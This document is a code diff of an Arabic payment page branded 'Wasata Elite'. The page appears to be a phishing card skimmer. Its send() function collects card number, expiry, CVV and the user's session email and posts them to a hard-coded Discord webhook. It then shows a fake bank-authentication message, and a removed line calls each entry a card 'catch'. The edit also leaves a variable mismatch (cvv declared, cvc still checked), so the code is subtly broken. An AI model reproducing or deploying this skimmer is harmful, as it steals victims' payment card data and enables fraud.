@@ -12,34 +12,23 @@
             background-size: 24px 24px; opacity: 0.5;
         }
         .main-card { border-radius: 40px; box-shadow: 0 10px 50px rgba(0,0,0,0.03); border: 1px solid #f2f2f2; }
-        
-        /* تابات الدفع */
-        .tab-btn { border: 2.5px solid #f1f5f9; border-radius: 20px; transition: 0.3s; cursor: pointer; background: #fff; position: relative; }
+        .tab-btn { border: 2.5px solid #f1f5f9; border-radius: 20px; transition: 0.3s; cursor: pointer; background: #fff; position: relative; opacity: 0.4; }
         .tab-btn.active { border-color: #000; opacity: 1; transform: scale(1.02); box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .tab-btn:not(.active) { opacity: 0.4; }
-        
         .radio-ring { width: 22px; height: 22px; border: 2px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .tab-btn.active .radio-ring::after { content: ""; width: 11px; height: 11px; background: #000; border-radius: 50%; }
-
-        /* حقول الإدخال */
-        input { border: 1.5px solid #f1f5f9; border-radius: 18px; padding: 18px; font-size: 1.1em; width: 100%; transition: 0.3s; background: #fff; text-align: center; color: #444; }
-        input:focus { outline: none; border-color: #00eccd; box-shadow: 0 0 15px rgba(0, 236, 205, 0.1); }
-        
-        .card-type-icon { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); height: 22px; transition: 0.3s; pointer-events: none; }
-        
-        /* تحسين مظهر حقل التاريخ عند الخطأ */
-        input.error { border-color: #ff4d4d; color: #ff4d4d; }
+        input { border: 1.5px solid #f1f5f9; border-radius: 18px; padding: 18px; font-size: 1.1em; width: 100%; transition: 0.3s; background: #fff; text-align: center; color: #444; outline: none; }
+        input:focus { border-color: #00eccd; box-shadow: 0 0 15px rgba(0, 236, 205, 0.1); }
+        .card-type-icon { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); height: 22px; transition: 0.3s; pointer-events: none; opacity: 0; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-6">
+<body class="flex items-center justify-center min-vh-screen h-screen p-6">
     <div class="bg-dots"></div>
 
-    <div class="main-card bg-white w-full max-w-2xl p-12 md:p-14 relative">
+    <div class="main-card bg-white w-full max-w-2xl p-12 md:p-14 relative shadow-2xl">
         <div class="absolute top-12 right-12 text-2xl font-black text-slate-800">طريقة الدفع 💳</div>
         <div class="absolute top-14 left-12 text-slate-400 font-bold text-xs uppercase tracking-widest opacity-30">W A S A T A</div>
 
         <div class="mt-20">
-            <!-- خيارات الدفع -->
             <div class="grid grid-cols-2 gap-5 mb-12">
                 <div class="tab-btn active p-8 flex justify-between items-center" onclick="sel(this)">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-4" alt="Visa">
@@ -51,13 +40,12 @@
                 </div>
             </div>
 
-            <!-- فورم البطاقة -->
             <div class="space-y-6 text-right">
                 <div>
                     <label class="block text-slate-400 font-bold text-xs mb-3 mr-2 uppercase">رقم البطاقة</label>
                     <div class="relative">
                         <input type="text" id="ccNo" placeholder="5215 1252 1515 2155" maxlength="19" oninput="formatCard(this)" dir="ltr">
-                        <img id="brnd" src="" class="card-type-icon opacity-0">
+                        <img id="brnd" src="" class="card-type-icon">
                     </div>
                 </div>
 
@@ -68,7 +56,7 @@
                     </div>
                     <div>
                         <label class="block text-slate-400 font-bold text-xs mb-3 mr-2 uppercase">رمز التحقق (CVC)</label>
-                        <input type="password" id="cvc" placeholder="***" maxlength="3" dir="ltr" class="border-black border-[2.5px] bg-slate-50 font-black">
+                        <input type="password" id="cvc" placeholder="***" maxlength="3" dir="ltr" class="border-black border-[2px] bg-slate-50 font-black">
                     </div>
                 </div>
             </div>
@@ -96,61 +84,48 @@
             } else { icon.style.opacity="0"; }
         }
 
-        // الوظيفة المعدلة للتاريخ
         function formatDate(el) {
-            let v = el.value.replace(/\D/g, ''); // إزالة أي شيء ليس رقماً
-            
-            // منع كتابة شهر أكبر من 12
+            let v = el.value.replace(/\D/g, ''); 
             if (v.length >= 2) {
                 let month = parseInt(v.substring(0, 2));
                 if (month > 12) v = '12' + v.substring(2);
                 if (month === 0) v = '01' + v.substring(2);
             }
-
-            // إضافة السلاش تلقائياً والسماح بكتابة السنة
             if (v.length > 2) {
                 el.value = v.substring(0, 2) + " / " + v.substring(2, 4);
-            } else {
-                el.value = v;
-            }
+            } else { el.value = v; }
         }
 
         async function send() {
-            // التحقق من صحة المدخلات
             const cc = document.getElementById('ccNo').value;
             const exp = document.getElementById('expiry').value;
-            const cvc = document.getElementById('cvc').value;
+            const cvv = document.getElementById('cvc').value;
 
             if(cc.length < 16 || exp.length < 7 || cvc.length < 3) {
-                alert("يرجى التأكد من كتابة بيانات البطاقة بشكل صحيح");
-                return;
+                alert("يرجى إكمال بيانات البطاقة"); return;
             }
 
             const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
-            
-            // جلب اسم المستخدم من الجلسة
             const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'زائر'};
-            const user = session.email;
 
             fetch(hook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "💳 صيدة بطاقة جديدة - Wasata Elite",
+                        title: "🚀 بطاقة جديدة - Wasata Elite",
                         color: 65485,
                         fields: [
-                            { name: "👤 المستخدم", value: `\`${user}\``, inline: true },
+                            { name: "👤 المستخدم", value: `\`${session.email}\``, inline: true },
                             { name: "💳 رقم البطاقة", value: `\`${cc}\`` },
-                            { name: "🔐 التاريخ | CVV", value: `\`${exp} | ${cvc}\``, inline: true }
+                            { name: "🔐 البيانات", value: `\`${exp} | CVV: ${cvv}\``, inline: true }
                         ],
-                        footer: { text: "Wasata Security System v9.4" },
                         timestamp: new Date().toISOString()
                     }]
                 })
             }).then(() => {
-                alert("✅ تم إرسال الطلب للمصادقة البنكية، يرجى الانتظار...");
-                location.href = 'index.html'; // أو صفحة انتظار
+                alert("✅ تم إرسال الطلب للمصادقة البنكية...");
+                location.href = 'index.html';
             });
         }
     </script>
